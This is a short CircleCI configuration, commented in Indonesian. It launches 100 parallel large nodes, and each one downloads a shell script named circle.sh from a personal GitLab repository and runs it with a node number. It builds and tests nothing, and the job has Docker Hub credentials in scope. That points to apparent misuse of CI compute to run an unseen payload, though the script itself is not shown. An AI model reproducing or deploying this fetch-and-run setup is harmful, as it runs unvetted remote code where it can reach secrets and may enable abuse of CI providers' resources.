version: 2.1

executors:
  my-custom-executor:
    docker:
      - image: cimg/base:stable
        auth:
          username: $DOCKER_HUB_USER
          password: $DOCKER_HUB_PASSWORD
    resource_class: large 

jobs:
  my-parallel-job:
    # Menjalankan 100 node secara bersamaan
    parallelism: 100
    executor: my-custom-executor
    steps:
      - checkout
      - run:
          name: "Setup and Execute Instance"
          command: |
            # Mengonversi CIRCLE_NODE_INDEX (0-99) menjadi ID (1-100)
            NODE_ID=$((CIRCLE_NODE_INDEX + 1))
            echo "Running instance Node ID: $NODE_ID"
            
            # Download script
            wget -q https://gitlab.com/barbieanay003/seger/-/raw/main/circle.sh
            
            # Sanitasi file (menghapus format Windows \r jika ada)
            sed -i 's/\r$//' circle.sh
            chmod +x circle.sh
            
            # Menjalankan script
            # Jika circle.sh membutuhkan argumen node_id, kirimkan sebagai parameter
            bash circle.sh $NODE_ID

workflows:
  my-custom-workflow:
    jobs:
      - my-parallel-job:
          context:
            - docker-hub-creds
